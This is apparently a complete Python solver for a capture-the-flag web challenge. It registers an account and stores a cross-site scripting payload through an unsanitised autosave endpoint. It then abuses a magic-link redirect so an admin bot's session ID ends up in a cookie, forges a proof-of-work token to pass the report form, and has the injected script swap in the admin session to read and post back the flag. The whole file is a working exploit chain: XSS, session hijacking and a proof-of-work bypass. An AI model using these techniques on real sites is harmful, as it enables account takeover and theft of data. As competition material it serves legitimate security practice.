#!/usr/bin/env python3
import base64
import os
import re
import sys
import time
import uuid
from dataclasses import dataclass
from urllib.parse import urljoin

import requests


POW_VERSION = "s"
POW_MOD = (1 << 1279) - 1


def _pow_bytes_to_int(buf: bytes) -> int:
    return int.from_bytes(buf, "big") if buf else 0


@dataclass(frozen=True)
class PowChallenge:
    difficulty: int
    x: int


def pow_decode_challenge(value: str) -> PowChallenge:
    parts = str(value or "").split(".", 2)
    if len(parts) != 3 or parts[0] != POW_VERSION:
        raise ValueError("invalid pow challenge")
    d_bytes = base64.b64decode(parts[1])
    if len(d_bytes) > 4:
        raise ValueError("invalid difficulty bytes")
    difficulty = int.from_bytes(d_bytes.rjust(4, b"\x00"), "big")
    x = _pow_bytes_to_int(base64.b64decode(parts[2]))
    return PowChallenge(difficulty=difficulty, x=x)


def pow_encode_solution(y: int) -> str:
    if y == 0:
        y_bytes = b"\x00"
    else:
        y_bytes = y.to_bytes((y.bit_length() + 7) // 8, "big")
    return f"{POW_VERSION}.{base64.b64encode(y_bytes).decode()}"


def pow_is_residue(a: int) -> bool:
    a %= POW_MOD
    if a == 0:
        return True
    # Legendre symbol a^((p-1)/2) mod p
    return pow(a, (POW_MOD - 1) // 2, POW_MOD) == 1


def pow_sqrt_mod(a: int) -> int:
    # p = 2^1279 - 1 is a Mersenne prime, p % 4 == 3
    return pow(a % POW_MOD, (POW_MOD + 1) // 4, POW_MOD)


def pow_solve(challenge: str) -> str:
    decoded = pow_decode_challenge(challenge)
    target = decoded.x % POW_MOD
    if not pow_is_residue(target):
        target = (POW_MOD - target) % POW_MOD

    current = target
    for step in range(decoded.difficulty):
        root = pow_sqrt_mod(current)
        candidate_a = root ^ 1
        candidate_b = ((POW_MOD - root) % POW_MOD) ^ 1

        # For all intermediate states y_i where i >= 1, y_i must be a quadratic residue
        # because it is the output of the previous squaring step. Only y_0 can be arbitrary.
        if step < decoded.difficulty - 1:
            current = candidate_a if pow_is_residue(candidate_a) else candidate_b
        else:
            current = candidate_a

    return pow_encode_solution(current)


def pow_forge_bypass(expected_difficulty: int) -> tuple[str, str]:
    d_bytes = expected_difficulty.to_bytes(4, "big")
    d_b64 = base64.b64encode(d_bytes).decode()
    x_b64 = base64.b64encode(b"\x00").decode()
    forged_challenge = f"{POW_VERSION}.{d_b64}.{x_b64}"

    # With x = 0: y = 0 works for even difficulty; y = 1 works for odd difficulty.
    forged_solution = pow_encode_solution(0 if expected_difficulty % 2 == 0 else 1)
    return forged_challenge, forged_solution


def _extract_first(regex: str, text: str) -> str | None:
    match = re.search(regex, text, re.IGNORECASE)
    return match.group(1) if match else None


def main() -> None:
    base = os.environ.get("BASE_URL", "http://34.26.148.28:5000").rstrip("/")
    session = requests.Session()
    session.headers.update({"User-Agent": "uoctf-solver/1.0"})

    username = f"user_{uuid.uuid4().hex[:10]}"
    password = f"pass_{uuid.uuid4().hex}"
    print(f"[i] base={base}", file=sys.stderr)
    print(f"[i] username={username}", file=sys.stderr)
    print(f"[i] password={password}", file=sys.stderr)

    register = session.post(
        urljoin(base, "/register"),
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=10,
    )
    if register.status_code not in (302, 303):
        raise RuntimeError(f"register failed: {register.status_code}")

    login = session.post(
        urljoin(base, "/login"),
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=10,
    )
    if login.status_code not in (302, 303):
        raise RuntimeError(f"login failed: {login.status_code}")

    create_post = session.get(urljoin(base, "/edit"), allow_redirects=False, timeout=10)
    if create_post.status_code not in (302, 303):
        raise RuntimeError(f"create post failed: {create_post.status_code}")
    location = create_post.headers.get("Location", "")
    post_id = _extract_first(r"/edit/(\d+)", location)
    if not post_id:
        raise RuntimeError("could not determine post id")
    print(f"[i] post_id={post_id}", file=sys.stderr)

    # Stored XSS in draftContent (server-side autosave endpoint does not sanitize).
    # Chain: admin bot (logged in as admin) hits /magic/<token> -> sid_prev gets admin session id,
    # sid becomes our session; then redirects to our /edit/<postId> which executes this payload.
    payload = f"""
<script>
(async () => {{
  try {{
    const cookieMap = Object.fromEntries(document.cookie.split('; ').filter(Boolean).map(p => {{
      const idx = p.indexOf('=');
      return idx === -1 ? [p, ''] : [p.slice(0, idx), p.slice(idx + 1)];
    }}));
    const mySid = cookieMap.sid || '';
    const adminSid = cookieMap.sid_prev || '';
    if (!mySid || !adminSid) return;

    document.cookie = 'sid=' + adminSid + '; path=/';
    const flag = await fetch('/flag', {{ credentials: 'include' }}).then(r => r.text());
    document.cookie = 'sid=' + mySid + '; path=/';

    await fetch('/api/save', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json' }},
      body: JSON.stringify({{ postId: {post_id}, content: '<p>' + flag + '</p>' }})
    }});
  }} catch (e) {{}}
}})();
</script>
""".strip()

    autosave = session.post(
        urljoin(base, "/api/autosave"),
        json={"postId": int(post_id), "content": payload},
        timeout=10,
    )
    if not autosave.ok:
        raise RuntimeError(f"autosave failed: {autosave.status_code}")

    gen_link = session.post(urljoin(base, "/magic/generate"), allow_redirects=False, timeout=10)
    if gen_link.status_code not in (302, 303):
        raise RuntimeError(f"magic link generation failed: {gen_link.status_code}")

    account = session.get(urljoin(base, "/account"), timeout=10)
    token = _extract_first(r"/magic/([0-9a-f]{32})", account.text)
    if not token:
        raise RuntimeError("could not find magic link token")
    print(f"[i] token={token}", file=sys.stderr)

    target_path = f"/magic/{token}?redirect=/edit/{post_id}"

    report_page = session.get(urljoin(base, "/report"), timeout=10)
    pow_challenge = _extract_first(r'name="pow_challenge"\s+value="([^"]+)"', report_page.text)
    form = {"url": target_path}
    if pow_challenge:
        decoded = pow_decode_challenge(pow_challenge)
        print(f"[i] pow difficulty={decoded.difficulty}", file=sys.stderr)
        forged_challenge, forged_solution = pow_forge_bypass(decoded.difficulty)
        form["pow_challenge"] = forged_challenge
        form["pow_solution"] = forged_solution

    report = session.post(urljoin(base, "/report"), data=form, timeout=30)
    if report.status_code != 200:
        raise RuntimeError(f"report submit failed: {report.status_code}")
    status = _extract_first(r'class="alert success">([^<]+)', report.text) or ""
    error = _extract_first(r'class="alert">([^<]+)', report.text) or ""
    if error:
        raise RuntimeError(f"report error: {error}")
    if not status:
        raise RuntimeError("report did not return a status message")

    # Wait for the bot to visit and for our post to be overwritten with the flag.
    deadline = time.time() + 120
    flag_re = re.compile(r"[a-z0-9]{2,32}\{[^}]{5,200}\}", re.IGNORECASE)
    while time.time() < deadline:
        view = session.get(urljoin(base, f"/post/{post_id}"), timeout=10)
        match = flag_re.search(view.text)
        if match:
            print(match.group(0))
            return
        time.sleep(2)

    snippet = _extract_first(r'<div class="rich-content">(.+?)</div>', view.text) or ""
    snippet = re.sub(r"<[^>]+>", "", snippet)
    snippet = re.sub(r"\\s+", " ", snippet).strip()
    raise RuntimeError(f"flag not found; last post content: {snippet[:200]!r}")


if __name__ == "__main__":
    main()
